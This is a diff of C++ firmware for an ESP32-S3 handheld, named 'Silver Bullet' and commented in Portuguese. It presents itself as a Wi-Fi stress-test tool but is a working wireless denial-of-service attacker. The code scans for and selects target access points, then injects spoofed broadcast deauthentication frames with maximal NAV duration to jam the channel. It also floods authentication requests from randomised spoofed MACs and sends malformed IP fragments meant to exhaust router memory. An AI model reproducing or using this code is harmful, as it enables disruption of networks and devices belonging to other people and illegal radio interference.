@@ -1,3 +1,16 @@
+/**
+ * @file silver_bullet.cpp
+ * @brief Silver Bullet - Ferramenta Avançada de Teste de Estresse Wi-Fi (L2/L3)
+ * @hardware M5Stack Cardputer (ESP32-S3)
+ * * @details
+ * Esta versão implementa técnicas agressivas de esgotamento de recursos:
+ * 1. Zero-Copy DMA: Transmissão direta da RAM para o rádio.
+ * 2. NAV Spoofing (Jamming): Reserva o espectro de rádio por 32.767µs por quadro.
+ * 3. Auth Flood: Esgota a tabela de estado de clientes do AP.
+ * 4. Memory Exhaustion L3: Fragmentação infinita forçando estouro de buffer no kernel alvo.
+ * 5. Rádio Always-On: Desativação do Modem Sleep para TX contínuo.
+ */
+
 #include <M5Unified.h>
 #include <esp_wifi.h>
 #include <esp_system.h>
@@ -7,13 +20,13 @@
 #include <freertos/task.h>
 #include <atomic>
 #include <lwip/def.h> 
+#include <esp_heap_caps.h>
 
 // -------------------------------------------------------------------
-// 1. ESTRUTURAS DE ATAQUE (Layer 2 e Layer 3)
+// 1. ESTRUTURAS OTIMIZADAS PARA DMA (ALINHAMENTO DE 4 BYTES)
 // -------------------------------------------------------------------
-// __attribute__((packed)) garante que o compilador não adicione bytes extras (padding),
-// mantendo o cabeçalho perfeito para injeção via rádio.
-struct __attribute__((packed)) DeauthPacket {
+
+struct __attribute__((packed, aligned(4))) DeauthPacket {
     uint16_t frame_control;
     uint16_t duration;
     uint8_t  mac_dest[6];
@@ -21,6 +34,19 @@ struct __attribute__((packed)) DeauthPacket {
     uint8_t  mac_bssid[6];
     uint16_t seq_ctrl;
     uint16_t reason_code;
+};
+
+// Estrutura para o Auth Flood (Management Frame)
+struct __attribute__((packed, aligned(4))) AuthPacket {
+    uint16_t frame_control;
+    uint16_t duration;
+    uint8_t  mac_dest[6];
+    uint8_t  mac_src[6];
+    uint8_t  mac_bssid[6];
+    uint16_t seq_ctrl;
+    uint16_t auth_algorithm;
+    uint16_t auth_seq;
+    uint16_t status_code;
 };
 
 struct __attribute__((packed)) MacHeader {
@@ -45,31 +71,63 @@ struct __attribute__((packed)) IpHeader {
     uint8_t  ip_dest[4];    
 };
 
-struct __attribute__((packed)) SilverBulletPacket {
+struct __attribute__((packed, aligned(4))) SilverBulletPacket {
     MacHeader mac;
     IpHeader ip;
-    uint8_t payload[32];    
+    uint8_t payload[32]; 
 };
 
 // -------------------------------------------------------------------
-// 2. VARIÁVEIS GLOBAIS E SINCRONIZAÇÃO (Thread-Safe)
+// 2. VARIÁVEIS GLOBAIS E SINCRONIZAÇÃO
 // -------------------------------------------------------------------
-#define MAX_ALVOS 10
+#define MAX_ALVOS 15
 wifi_ap_record_t alvos_encontrados[MAX_ALVOS];
 uint16_t total_alvos = 0;
 int alvo_selecionado = 0;
 
-// Variáveis atômicas previnem "Race Conditions" entre os Cores do ESP32-S3
 std::atomic<uint8_t> canal_atual_alvo{0};
 std::atomic<int8_t> rssi_alvo{0};
 std::atomic<bool> alvo_perdido{false};
-std::atomic<bool> tx_power_max{true}; // Controle térmico e de bateria
+std::atomic<bool> tx_power_max{true}; 
 
 enum EstadoFerramenta { ESTADO_ESCANEAR, ESTADO_SELECIONAR, ESTADO_ATIRAR };
 std::atomic<EstadoFerramenta> estado_atual{ESTADO_ESCANEAR};
 
+uint32_t prng_state = 1;
+
 // -------------------------------------------------------------------
-// 3. UTILITÁRIOS E INTERFACE (UI)
+// 3. MOTORES DE ALTA PERFORMANCE (SRAM / IRAM_ATTR)
+// -------------------------------------------------------------------
+
+/**
+ * @brief Xorshift32 - Gerador Pseudoaleatório Bitwise (Zero Latency)
+ */
+IRAM_ATTR inline uint32_t fast_rand() {
+    uint32_t x = prng_state;
+    x ^= x << 13;
+    x ^= x >> 17;
+    x ^= x << 5;
+    return prng_state = x;
+}
+
+/**
+ * @brief Checksum IPv4 RFC 1071 (Otimizado)
+ */
+IRAM_ATTR inline uint16_t calcular_checksum_ip(void *vdata, size_t length) {
+    uint16_t *data = (uint16_t *)vdata;
+    uint32_t acc = 0;
+    for (size_t i = 0; i < length / 2; ++i) acc += data[i];
+    if (length & 1) {
+        uint16_t word = 0;
+        memcpy(&word, data + length - 1, 1);
+        acc += word;
+    }
+    while (acc >> 16) acc = (acc & 0xffff) + (acc >> 16);
+    return ~acc;
+}
+
+// -------------------------------------------------------------------
+// 4. INTERFACE E SCANNER
 // -------------------------------------------------------------------
 void escanear_redes() {
     M5.Display.clear();
@@ -86,15 +144,12 @@ void escanear_redes() {
     
     if (total_alvos > MAX_ALVOS) total_alvos = MAX_ALVOS;
     alvo_selecionado = 0;
-    
     estado_atual.store(ESTADO_SELECIONAR);
 }
 
 void desenhar_menu() {
     M5.Display.clear();
     M5.Display.setCursor(0, 0);
-    
-    // Mostra o status da potência do rádio (bateria/calor)
     M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
     M5.Display.printf("⚡ PWR: %s | [ESPACO] Muda\n", tx_power_max.load() ? "MAX (20dBm)" : "ECO (10dBm)");
     M5.Display.drawLine(0, 15, 240, 15, TFT_DARKGREY);
@@ -103,46 +158,19 @@ void desenhar_menu() {
     if (total_alvos == 0) {
         M5.Display.setTextColor(TFT_RED, TFT_BLACK);
         M5.Display.println("Nenhum alvo encontrado!");
-        M5.Display.println("Pressione [ENTER] para re-scan.");
         return;
     }
 
-    for (int i = 0; i < total_alvos; i++) {
-        if (i == alvo_selecionado) {
-            M5.Display.setTextColor(TFT_BLACK, TFT_WHITE); // Highlight no alvo
-        } else {
-            M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-        }
+    int inicio = (alvo_selecionado / 5) * 5;
+    for (int i = inicio; i < inicio + 5 && i < total_alvos; i++) {
+        if (i == alvo_selecionado) M5.Display.setTextColor(TFT_BLACK, TFT_WHITE); 
+        else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
         M5.Display.printf("%d. %s (CH: %d)\n", i + 1, alvos_encontrados[i].ssid, alvos_encontrados[i].primary);
     }
 }
 
-uint16_t calcular_checksum_ip(void *vdata, size_t length) {
-    char *data = (char *)vdata;
-    uint32_t acc = 0xffff;
-    for (size_t i = 0; i + 1 < length; i += 2) {
-        uint16_t word;
-        memcpy(&word, data + i, 2);
-        acc += ntohs(word);
-        if (acc > 0xffff) acc -= 0xffff;
-    }
-    if (length & 1) {
-        uint16_t word = 0;
-        memcpy(&word, data + length - 1, 1);
-        acc += ntohs(word);
-        if (acc > 0xffff) acc -= 0xffff;
-    }
-    return htons(~acc);
-}
-
-void gerar_payload_dinamico(uint8_t* payload, size_t tamanho) {
-    for(size_t i = 0; i < tamanho; i++) {
-        payload[i] = (uint8_t)(esp_random() & 0xFF);
-    }
-}
-
 // -------------------------------------------------------------------
-// 4. TASK: MONITORAMENTO INTELIGENTE (Core 1)
+// 5. TASKS ASSÍNCRONAS (CORE 1)
 // -------------------------------------------------------------------
 void task_monitoramento(void *pvParameters) {
     while (true) {
@@ -159,7 +187,6 @@ void task_monitoramento(void *pvParameters) {
                 rssi_alvo.store(temp_record.rssi);
                 alvo_perdido.store(false);
             } else {
-                // Rastreamento Automático (Auto-Channel Tracking)
                 alvo_perdido.store(true);
                 for (int ch = 1; ch <= 13; ch++) {
                     scan_config.channel = ch;
@@ -175,102 +202,127 @@ void task_monitoramento(void *pvParameters) {
                 }
             }
         }
-        vTaskDelay(pdMS_TO_TICKS(2000)); 
+        vTaskDelay(pdMS_TO_TICKS(1500)); 
     }
 }
 
-// -------------------------------------------------------------------
-// 5. TASK: INTERFACE GRÁFICA (Core 1)
-// -------------------------------------------------------------------
 void task_display(void *pvParameters) {
     while (true) {
         if (estado_atual.load() == ESTADO_ATIRAR) {
             if (!alvo_perdido.load()) {
                 M5.Display.setCursor(0, 0);
                 M5.Display.setTextColor(TFT_RED, TFT_BLACK);
-                M5.Display.printf("⚔️ ATAQUE: %s\n", alvos_encontrados[alvo_selecionado].ssid);
-                M5.Display.printf("CH: %d | RSSI: %d dBm \nBAT: %.2fV\n", 
+                M5.Display.printf("⚔️ ALVO TRAVADO: %s\n", alvos_encontrados[alvo_selecionado].ssid);
+                M5.Display.printf("CH: %d | SINAL: %d dBm \nBAT: %.2fV\n", 
                                   canal_atual_alvo.load(), rssi_alvo.load(), M5.Power.getBatteryVoltage());
                 
-                // Barra de sinal visual
                 int barra = map(rssi_alvo.load(), -100, -20, 0, 240);
                 M5.Display.fillRect(0, 50, barra, 10, (rssi_alvo.load() > -65) ? TFT_GREEN : TFT_MAROON);
-                M5.Display.fillRect(barra, 50, 240-barra, 10, TFT_BLACK); // Limpa o rastro
+                M5.Display.fillRect(barra, 50, 240-barra, 10, TFT_BLACK);
                 
                 M5.Display.setCursor(0, 70);
                 M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
-                M5.Display.println("[BACKSPACE] para abortar.");
-                
+                M5.Display.println("INJETANDO... [BACKSPACE] Para.");
             } else {
                 M5.Display.setCursor(0, 40);
                 M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
                 M5.Display.printf("⚠️ ALVO PERDIDO! RASTREANDO...\n");
             }
         }
-        vTaskDelay(pdMS_TO_TICKS(250)); // Atualiza UI a 4 FPS
+        vTaskDelay(pdMS_TO_TICKS(500)); 
     }
 }
 
 // -------------------------------------------------------------------
-// 6. TASK: MOTOR DE ATAQUE HÍBRIDO ASSÍNCRONO (Core 0)
+// 6. MOTOR DE INJEÇÃO DMA (CORE 0 - GOD MODE)
 // -------------------------------------------------------------------
 void task_ataque(void *pvParameters) {
-    SilverBulletPacket pkt;
-    DeauthPacket deauth;
+    
+    // Alocação Zero-Copy no DMA
+    SilverBulletPacket* pkt = (SilverBulletPacket*) heap_caps_malloc(sizeof(SilverBulletPacket), MALLOC_CAP_DMA);
+    DeauthPacket* deauth = (DeauthPacket*) heap_caps_malloc(sizeof(DeauthPacket), MALLOC_CAP_DMA);
+    AuthPacket* auth = (AuthPacket*) heap_caps_malloc(sizeof(AuthPacket), MALLOC_CAP_DMA);
+    
+    prng_state = esp_random(); 
+
+    // Payload estático L3 (O Roteador não lê payload de fragmentos, apenas o cabeçalho)
+    for(size_t i = 0; i < sizeof(pkt->payload); i++) pkt->payload[i] = (uint8_t)(fast_rand() & 0xFF);
 
     while (true) {
         if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load()) {
             
-            // Controle Térmico: Ajusta a potência on-the-fly
-            if(tx_power_max.load()) {
-                esp_wifi_set_max_tx_power(80); // 20dBm (Máximo, gasta bateria rápido)
-            } else {
-                esp_wifi_set_max_tx_power(40); // 10dBm (Modo ECO, evita superaquecimento)
-            }
-
+            esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 40); 
             esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
             uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
 
-            // Prepara base Deauth (Layer 2)
-            memset(&deauth, 0, sizeof(deauth));
-            deauth.frame_control = 0x00C0; 
-            memcpy(deauth.mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6); // Broadcast
-            memcpy(deauth.mac_src, mac_alvo, 6);
-            memcpy(deauth.mac_bssid, mac_alvo, 6);
-            deauth.reason_code = 0x0001;
+            // --- L2: DEAUTH (NAV SPOOFING / JAMMING) ---
+            memset(deauth, 0, sizeof(DeauthPacket));
+            deauth->frame_control = 0x00C0; 
+            deauth->duration = 32767; // Silencia o canal virtualmente (Manda os outros rádios calarem a boca)
+            memcpy(deauth->mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
+            memcpy(deauth->mac_src, mac_alvo, 6);
+            memcpy(deauth->mac_bssid, mac_alvo, 6);
+            deauth->reason_code = 0x0001;
 
-            // Prepara base Fragmentação (Layer 3)
-            memset(&pkt, 0, sizeof(pkt));
-            pkt.mac.frame_control = 0x0008; 
-            memcpy(pkt.mac.mac_dest, mac_alvo, 6);
-            memcpy(pkt.mac.mac_bssid, mac_alvo, 6);
-            pkt.ip.version_ihl = 0x45; 
-            pkt.ip.total_length = htons(0xFFFF); 
-            pkt.ip.frag_off = htons(0x2000); 
-            pkt.ip.protocol = 17;
+            // --- L2: AUTH FLOOD ---
+            memset(auth, 0, sizeof(AuthPacket));
+            auth->frame_control = 0x00B0; 
+            auth->duration = 32767; // Jamming passivo contínuo
+            memcpy(auth->mac_dest, mac_alvo, 6);
+            memcpy(auth->mac_bssid, mac_alvo, 6);
+            auth->auth_algorithm = 0x0000; 
+            auth->auth_seq = 0x0100;
+            auth->status_code = 0x0000;
 
-            // 1. Rajada L2 (Desconexão)
-            for(int j=0; j<5; j++) {
-                deauth.seq_ctrl = (esp_random() & 0xFFF) << 4; // Burlar Anti-Replay
-                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &deauth, sizeof(deauth), false);
-                if (err == ESP_ERR_NO_MEM) vTaskDelay(pdMS_TO_TICKS(1)); // Proteção de Buffer
+            // --- L3: MEMORY EXHAUSTION ---
+            memset(&pkt->mac, 0, sizeof(MacHeader)); 
+            memset(&pkt->ip, 0, sizeof(IpHeader));
+            pkt->mac.frame_control = 0x0008; 
+            memcpy(pkt->mac.mac_dest, mac_alvo, 6);
+            memcpy(pkt->mac.mac_bssid, mac_alvo, 6);
+            pkt->ip.version_ihl = 0x45; 
+            pkt->ip.ttl = 64;
+            pkt->ip.protocol = 17;
+
+            // 1. Rajada L2 Mista (Jamming + Tabela de Clientes OOM)
+            for(int j = 0; j < 15; j++) {
+                // MAC Spoofing (Simula clientes da mesma marca aleatorizando os ultimos 3 bytes)
+                memcpy(auth->mac_src, mac_alvo, 3); 
+                auth->mac_src[3] = fast_rand() & 0xFF;
+                auth->mac_src[4] = fast_rand() & 0xFF;
+                auth->mac_src[5] = fast_rand() & 0xFF;
+                
+                auth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
+                deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
+
+                esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false);
+                esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false);
             }
 
-            // 2. Rajada L3 (Fuzzing Dinâmico)
-            for (int i = 0; i < 60; i++) {
-                // MELHORIA: O payload agora é re-gerado a CADA pacote, 
-                // forçando o roteador a inspecionar lixo novo sempre (Stress DPI)
-                gerar_payload_dinamico(pkt.payload, sizeof(pkt.payload)); 
+            // 2. Rajada L3 (Destruição do Buffer Global do Roteador)
+            for (int i = 0; i < 150; i++) { 
+                memcpy(pkt->mac.mac_src, mac_alvo, 4);
+                pkt->mac.mac_src[4] = fast_rand() & 0xFF;
+                pkt->mac.mac_src[5] = fast_rand() & 0xFF;
+
+                pkt->ip.id = (uint16_t)fast_rand(); 
                 
-                pkt.ip.id = (uint16_t)esp_random(); 
-                pkt.ip.checksum = 0; 
-                pkt.ip.checksum = calcular_checksum_ip(&pkt.ip, sizeof(IpHeader));
+                // Mágica: Bit 13 ativado (More Fragments) + tamanho impossível
+                uint16_t offset_falso = fast_rand() & 0x1FFF;
+                pkt->ip.frag_off = htons(0x2000 | offset_falso); 
+                pkt->ip.total_length = htons(40000 + (fast_rand() % 5000)); 
+
+                pkt->ip.checksum = 0; 
+                pkt->ip.checksum = calcular_checksum_ip(&pkt->ip, sizeof(IpHeader));
                 
-                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &pkt, sizeof(pkt), false);
-                if (err == ESP_ERR_NO_MEM) vTaskDelay(pdMS_TO_TICKS(1));
+                esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, pkt, sizeof(SilverBulletPacket), false);
+                
+                if (err == ESP_ERR_NO_MEM) {
+                    taskYIELD(); 
+                    break;
+                }
             }
 
-            // Respiro pro Watchdog (Evita Kernel Panic no Core 0)
             vTaskDelay(pdMS_TO_TICKS(1)); 
 
         } else {
@@ -280,13 +332,13 @@ void task_ataque(void *pvParameters) {
 }
 
 // -------------------------------------------------------------------
-// 7. APP MAIN (Input / Controle de Estado)
+// 7. APP MAIN
 // -------------------------------------------------------------------
 extern "C" void app_main(void) {
     auto cfg = M5.config();
     M5.begin(cfg);
     M5.Display.setRotation(1);
-    M5.Display.setTextSize(1.5); // Fonte levemente maior para melhor leitura
+    M5.Display.setTextSize(1.5);
     
     nvs_flash_init();
     esp_netif_init();
@@ -295,43 +347,42 @@ extern "C" void app_main(void) {
     esp_wifi_init(&wifi_cfg);
     esp_wifi_set_storage(WIFI_STORAGE_RAM);
     esp_wifi_set_mode(WIFI_MODE_STA);
+    
     esp_wifi_start();
+    
+    // FORÇA BRUTA: Impede o ESP32 de entrar em Modem Sleep (mantém TX no máximo)
+    esp_wifi_set_ps(WIFI_PS_NONE); 
 
-    // Inicia Tasks
-    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, configMAX_PRIORITIES - 1, NULL, 0); // Core 0 (Ataque)
-    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); // Core 1 (Tracker)
-    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); // Core 1 (UI)
+    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, configMAX_PRIORITIES - 1, NULL, 0); 
+    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
+    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 
 
     escanear_redes();
     desenhar_menu();
 
     while (true) {
-        M5.update(); // Atualiza o estado do teclado do Cardputer
+        M5.update(); 
         
         if (estado_atual.load() == ESTADO_SELECIONAR) {
-            
-            // Verifica se há redes antes de navegar (Proteção contra Underflow)
             if (total_alvos > 0) {
-                if (M5.Keyboard.isKeyPressed(KEY_DOWN) && alvo_selecionado < (total_alvos - 1)) {
-                    alvo_selecionado++; 
+                if (M5.Keyboard.isKeyPressed(KEY_DOWN)) {
+                    alvo_selecionado = (alvo_selecionado + 1) % total_alvos;
                     desenhar_menu(); 
-                    vTaskDelay(pdMS_TO_TICKS(200)); // Debounce aprimorado
+                    vTaskDelay(pdMS_TO_TICKS(150)); 
                 }
-                if (M5.Keyboard.isKeyPressed(KEY_UP) && alvo_selecionado > 0) {
-                    alvo_selecionado--; 
+                if (M5.Keyboard.isKeyPressed(KEY_UP)) {
+                    alvo_selecionado = (alvo_selecionado - 1 + total_alvos) % total_alvos;
                     desenhar_menu(); 
-                    vTaskDelay(pdMS_TO_TICKS(200));
+                    vTaskDelay(pdMS_TO_TICKS(150));
                 }
             }
 
-            // Alternar Potência do Rádio (Barra de Espaço)
             if (M5.Keyboard.isKeyPressed(' ')) {
                 tx_power_max.store(!tx_power_max.load());
                 desenhar_menu();
-                vTaskDelay(pdMS_TO_TICKS(300));
+                vTaskDelay(pdMS_TO_TICKS(200));
             }
 
-            // Iniciar Ataque
             if (M5.Keyboard.isKeyPressed(KEY_ENTER)) {
                 if (total_alvos > 0) {
                     canal_atual_alvo.store(alvos_encontrados[alvo_selecionado].primary);
@@ -346,16 +397,14 @@ extern "C" void app_main(void) {
             }
         } 
         else if (estado_atual.load() == ESTADO_ATIRAR) {
-            // Parar ataque
             if (M5.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
                 estado_atual.store(ESTADO_SELECIONAR); 
                 esp_wifi_set_promiscuous(false);
-                escanear_redes(); // Força um re-scan para atualizar as redes ao sair
+                escanear_redes(); 
                 desenhar_menu();
                 vTaskDelay(pdMS_TO_TICKS(300));
             }
         }
-        
-        vTaskDelay(pdMS_TO_TICKS(10));
+        vTaskDelay(pdMS_TO_TICKS(10)); 
     }
 }
